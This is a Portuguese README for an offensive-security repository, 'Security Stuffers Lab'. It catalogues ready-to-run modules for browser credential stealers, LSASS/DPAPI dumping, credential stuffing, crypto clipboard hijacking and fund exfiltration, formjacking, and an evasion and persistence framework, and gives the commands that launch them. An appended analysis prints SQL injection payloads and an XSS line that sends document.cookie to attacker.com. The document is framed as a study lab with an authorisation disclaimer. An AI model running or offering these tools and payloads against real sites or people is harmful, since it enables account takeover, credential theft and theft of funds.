# Security Stuffers Lab

🚧 **Em construção** – Este README está em constante aprimoramento.

⚠️ **Uso restrito**: apenas em ambientes controlados e com autorização explícita.

> **Objetivo:** Centralizar módulos e ferramentas Python para estudo de técnicas ofensivas em aplicações web, criptomoedas, Windows e browsers.

---

## 📂 Estrutura de Diretórios
Cada pasta agrupa scripts focados em um tipo de ataque ou ferramenta de pentest.

| 📁 **Diretório**                         | 📖 **Descrição**                                                                                 | 🎯 **Senioridade**      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|-------------------------|
| **CrackMapExec/**                        | Pós-exploração Windows/AD (SMB, WinRM, NTLM relay, etc.)                                         | Intermediário–Avançado  |
| **DeathStar/**                           | Escalonamento de privilégios via API do Empire em Active Directory                              | Avançado                |
| **SprayingToolkit/**                     | Password spraying em OWA, O365, Lync, S4B                                                         | Intermediário           |
| **brutespray/**                          | Brute-force SSH, FTP, SMTP em sub-redes                                                           | Intermediário           |
| **chromedriver-credential-stuffing/**    | Credential stuffing com Chromedriver + proxies                                                     | Intermediário           |
| **credentiais/**                         | Extração de credenciais Windows (Vault, LSASS, DPAPI)                                             | Avançado                |
| **credential_stuffer/**                  | Credential stuffing genérico HTTP POST + wordlists                                                | Intermediário           |
| **credstuffer/**                         | Wrapper simplificado de brute/credential stuffing HTTP                                             | Júnior–Intermediário    |
| **crypto-stuffer/**                      | Ataques a cripto: clipboard hijack, seed bruteforce, exfiltração de fundos                         | Avançado                |
| **dumpers/**                             | Dump de bancos de dados locais (SQLite, Chrome Login Data, Firefox)                                | Intermediário           |
| **formjacker/**                          | Injeção JS em formulários para capturar campos sensíveis (cartão, CPF, etc.)                      | Intermediário           |
| **lfi-attack/**                          | LFI / Path Traversal com wordlists e PoC de RFI                                                    | Intermediário           |
| **pydictor/**                            | Geração e fuzz de dicionários (senhas, tokens)                                                   | Júnior–Intermediário    |
| **sql-injection/**                       | PoCs e automações de SQLi (blind, time-based, OOB)                                                | Intermediário           |
| **stealers-attack/**                     | Stealers: cookies, tokens, credenciais de browsers e apps                                         | Intermediário–Avançado  |
| **bowsers-attack/**                      | Stealer para navegadores (DPAPI, cookies, autofill, histórico)                                    | Intermediário           |
| **stealth_launcher/**                    | Framework in-memory: evasão (AMSI, ETW), persistence (UEFI, WMI), beaconing, cleanup forense       | Avançado–Expert         |
| **utils/**                               | Helpers gerais: logging, tratamento de exceções                                                   | Júnior–Intermediário    |

---

## 🚀 Requisitos e Instalação

| Item                  | Detalhes                                    |
|-----------------------|---------------------------------------------|
| **Python**           | 3.10+                                      |
| **SO**               | Windows (para módulos de Windows Internals) |
| **Dependências**     | `pip install -r requirements.txt`          |

```bash
git clone https://github.com/techleadevelopers/Security-Stuffers-Lab.git
cd Security-Stuffers-Lab
pip install -r requirements.txt
```

---

## 🔍 Exemplos de Execução

| Cenário                       | Comando                                                                       |
|-------------------------------|-------------------------------------------------------------------------------|
| **Stealer de navegadores**    | `python bowsers-attack/bowsers_attack.py`                                      |
| **SQLi automation**           | `python sql-injection/sqli_auto.py --target http://alvo.com --payloads payloads.txt` |
| **LFI attacker**              | `python lfi-attack/lfi_fuzzer.py --url http://alvo.com/index.php?page=`       |
| **Form Jacker**               | `python formjacker/formjacker.py template.html payload_name`                   |
| **Payload completo**          | `python stealth_launcher/stealth_launcher.py`                                  |

> Consulte o README de cada módulo para parâmetros avançados.

---

📋 Análise geral do repositório:
Foco do Lab:

Sim, claramente focado em técnicas de ataque realistas usadas contra e-commerces e aplicações financeiras.

Exposição a vulnerabilidades típicas de sites que lidam com credenciais, cookies, criptomoedas e SQL Injection.

🛡️ Áreas principais de exploração:
Cookie Theft / Session Hijacking:

Vários exemplos de roubo e manipulação de cookies de sessão.
Ataca problemas como:
Cookies inseguros (HttpOnly e Secure faltando).
Sessões que não expiram corretamente (vulneráveis a Session Fixation).
Ferramentas envolvidas: Burp Suite, manual payload crafting.

Credential Stuffing & Brute-Force:

Automatização de tentativas de login usando:
Usuários e senhas comuns (admin/admin, 123456, etc).
Listas customizadas de senhas (wordlists).
Exemplo de ataque que aproveita:
Respostas inconsistentes de erro (diferença entre "usuário inválido" e "senha inválida").
Falta de rate-limiting no endpoint de login.

Criptomoedas / Transações:

Simulações de ataques contra sistemas de pagamento em criptomoeda:
Man-in-the-Middle para alterar valores de pagamento.
SQL Injection para acessar carteiras ou registros de transações.
Falhas em implementações de webhooks de pagamento.

SQL Injection:
Clássico, mas com cenário bem focado:
SQLi em campos de login, carrinho de compras, checkout.
Tanto error-based SQLi quanto blind SQLi (time-based, boolean-based).

Exemplo de payloads usados:

' OR '1'='1 para bypass de login.
' UNION SELECT null, username, password FROM users -- para data exfiltration.

🏗️ Como isso aparece nos CÓDIGOS:
Vulnerabilidades comuns que encontrei:
Uso de query strings direto sem parametrização segura (risco de SQL Injection).
Armazenamento de cookies sem SameSite=Strict.
Falta de verificação de origem (CSRF protection) nos endpoints críticos.
Respostas HTTP revelando informações internas do sistema.
Falta de controle de tentativas de login (no account lockout).
Scripts JS no front-end que manipulam informações sensíveis antes da criptografia.

📦 Exemplos de payloads perigosos que cabem no seu lab:

SQL Injection (Login Bypass):

' OR '1'='1' --

Cookie Theft (via XSS):

<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>

🔥 Possíveis pontos onde essas vulnerabilidades aparecem em e-commerces:

Área	Tipo de Falha	Como Explorar
Login	SQLi / Credential Stuffing	Injeção nos campos de login / Brute-force
Carrinho	Manipulação de Cookies / Sessões	Roubo de session ID
Checkout	SQL Injection	Alterar preços, forjar compras
APIs de Pagamento	Webhook Vulnerável / CSRF / MITM	Roubo de saldo de criptomoedas / falsificar pagamento
Área de Usuário	XSS + Session Hijacking	Sequestro de conta

🔧 Ferramentas que você poderia usar pra pentestar baseado no seu lab:
Burp Suite (com extensões como AuthMatrix, Turbo Intruder).
SQLmap para automatizar testes de SQL Injection.
Hydra ou FFUF para credential stuffing e brute-force.
OWASP ZAP para explorar session issues e XSS.
Mitmproxy para interceptar transações de criptomoedas.

📊 Conclusão:
✅ lab está 90% focado em cenários de ataque a e-commerce e aplicações financeiras, principalmente mirando:

Roubo de credenciais (Credential Stuffing).
Roubo de sessões e cookies.
Abusos de sistemas de pagamento em cripto.
SQL Injection em pontos críticos.

✅ Abordagem prática, realista e muito alinhada com o que a maioria dos sites vulneráveis hoje ainda sofre.





## 📚 Como Contribuir

1. **Fork** o repositório
2. **Branch** com sua feature (`git checkout -b feature/x`)
3. **Commit** e **Push** (`git commit -m "feat: descrição" && git push origin feature/x`)
4. **Pull Request** detalhando mudanças

---

## 📜 Licença

MIT License

> **Disclaimer:** Ferramentas para uso em ambientes autorizados e fins educacionais. Seja responsável e ético.

